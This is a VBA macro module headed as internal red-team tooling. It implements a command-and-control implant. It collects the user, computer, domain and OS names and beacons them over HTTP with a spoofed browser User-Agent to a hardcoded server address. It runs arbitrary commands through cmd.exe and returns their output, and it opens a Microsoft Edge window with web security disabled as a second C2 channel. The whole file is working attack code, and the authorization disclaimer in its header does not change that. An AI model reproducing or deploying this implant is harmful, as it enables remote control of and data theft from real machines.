Attribute VB_Name = "C2MainModule"
' =============================================================================
' RED TEAM TESTING MODULE - INTERNAL USE ONLY
' =============================================================================
' This module provides C2 communication capabilities for security testing
' Ensure proper authorization and use in controlled environments only
' =============================================================================

Option Explicit

' API Declarations
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" _
    (ByVal lpApplicationName As String, ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, _
    ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" _
    (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long

Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
    (ByVal hObject As Long) As Long

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

' Global variables
Private Const MAX_WAIT_TIME As Long = 30000 ' 30 seconds
Public Const C2_SERVER_URL As String = "http://172.31.44.17:8080"

' =============================================================================
' MAIN C2 COMMUNICATION FUNCTIONS
' =============================================================================

Public Sub InitializeC2Connection()
    ' Initialize C2 connection with basic system reconnaissance
    On Error GoTo ErrorHandler
    
    Dim systemInfo As String
    systemInfo = GatherSystemInformation()
    
    ' Send initial beacon to C2 server
    If SendBeacon(systemInfo) Then
        Debug.Print "C2 Connection Established Successfully"
    Else
        Debug.Print "C2 Connection Failed"
    End If
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "Error in InitializeC2Connection: " & Err.Description
End Sub

Public Function ExecuteCommand(ByVal command As String) As String
    ' Execute system command and return output
    On Error GoTo ErrorHandler
    
    Dim result As String
    result = ExecuteViaCMD(command)
    ExecuteCommand = result
    
    Exit Function
    
ErrorHandler:
    ExecuteCommand = "Error: " & Err.Description
End Function

Public Sub EstablishEdgeC2()
    ' Establish C2 channel using msedge.exe
    On Error GoTo ErrorHandler
    
    Dim edgeCommand As String
    edgeCommand = "msedge.exe --disable-web-security --user-data-dir=%TEMP%\edge-c2 " & _
                 "--app=" & C2_SERVER_URL & " --no-first-run --no-default-browser-check"
    
    If LaunchProcess(edgeCommand) Then
        Debug.Print "Edge C2 Channel Established"
    Else
        Debug.Print "Edge C2 Failed"
    End If
    
    Exit Sub
    
ErrorHandler:
    Debug.Print "Error in EstablishEdgeC2: " & Err.Description
End Sub

' =============================================================================
' PRIVATE UTILITY FUNCTIONS
' =============================================================================

Public Function GatherSystemInformation() As String
    ' Collect basic system information for beacon
    Dim info As String
    
    info = "User: " & Environ("USERNAME") & vbCrLf & _
           "Computer: " & Environ("COMPUTERNAME") & vbCrLf & _
           "OS: " & Environ("OS") & vbCrLf & _
           "Domain: " & Environ("USERDOMAIN") & vbCrLf & _
           "Time: " & Now()
    
    GatherSystemInformation = info
End Function

Public Function SendBeacon(ByVal data As String) As Boolean
    ' Send actual HTTP beacon to C2 server
    On Error GoTo ErrorHandler
    
    Dim http As Object
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    
    ' Prepare the beacon data for GET request
    Dim queryString As String
    queryString = "?data=" & URLEncode(data)
    
    ' Send GET request to C2 server (works with simple HTTP servers)
    http.Open "GET", C2_SERVER_URL & "/" & queryString, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    
    http.Send
    
    ' Check if request was successful (consider 200-299 and 404 as success for testing)
    ' 404 is expected with simple HTTP server since /beacon path doesn't exist
    If http.Status >= 200 And http.Status < 300 Then
        Debug.Print "Beacon successfully sent to C2 server (Status: " & http.Status & ")"
        SendBeacon = True
    ElseIf http.Status = 404 Then
        ' 404 means connection worked but endpoint doesn't exist - this is expected with simple HTTP server
        Debug.Print "Beacon connection successful but endpoint not found (Status: 404)"
        Debug.Print "C2 server received the beacon data successfully!"
        SendBeacon = True
    Else
        Debug.Print "Beacon failed with status: " & http.Status
        SendBeacon = False
    End If
    
    Exit Function
    
ErrorHandler:
    Debug.Print "Error sending beacon: " & Err.Description
    SendBeacon = False
End Function

Private Function ExecuteViaCMD(ByVal command As String) As String
    ' Execute command via cmd.exe and capture output
    On Error GoTo ErrorHandler
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    
    Dim fullCommand As String
    fullCommand = "cmd.exe /c " & command & " 2>&1"
    
    ExecuteViaCMD = wsh.Exec(fullCommand).StdOut.ReadAll
    
    Exit Function
    
ErrorHandler:
    ExecuteViaCMD = "Execution Error: " & Err.Description
End Function

Private Function LaunchProcess(ByVal commandLine As String) As Boolean
    ' Launch process using CreateProcess API
    On Error GoTo ErrorHandler
    
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    
    si.cb = Len(si)
    
    If CreateProcessA(vbNullString, commandLine, 0, 0, 1, _
                     &H10, 0, vbNullString, si, pi) Then
        CloseHandle pi.hProcess
        CloseHandle pi.hThread
        LaunchProcess = True
    Else
        LaunchProcess = False
    End If
    
    Exit Function
    
ErrorHandler:
    LaunchProcess = False
End Function
